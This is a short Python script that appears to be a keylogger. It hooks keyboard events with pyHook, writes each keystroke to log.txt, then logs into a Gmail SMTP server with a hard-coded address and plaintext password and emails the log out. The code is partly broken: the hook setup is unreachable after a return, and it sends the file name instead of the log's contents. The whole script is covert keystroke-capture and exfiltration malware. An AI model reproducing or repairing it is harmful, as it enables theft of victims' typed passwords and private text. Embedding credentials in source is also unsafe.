import pyHook, pythoncom, sys, logging, smtplib, ssl

file_log = 'log.txt'

def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)

    logging.log(10,chr(event.Ascii))
    return True

    hooks_manager = pyHook.HookManager()
    hooks_manager.KeyDown = OnKeyboardEvent
    hooks_manager.HookKeyboard()
    pythoncom.PumpMessages()

smtp_adress = 'smtp.gmail.com'
smtp_port = 465
email_adress = 'steevy.lelarbin@gmail.com'
email_password = 'filsdeputain'
email_receiver = 'sttevy.lelarbin@gmail.com'
email_content = file_log

context = ssl.create_default_context()
with smtplib.SMTP_SSL(smtp_adress, smtp_port, context=context) as server:
    server.login(email_adress, email_password)
    server.sendmail(email_adress, email_receiver, email_content)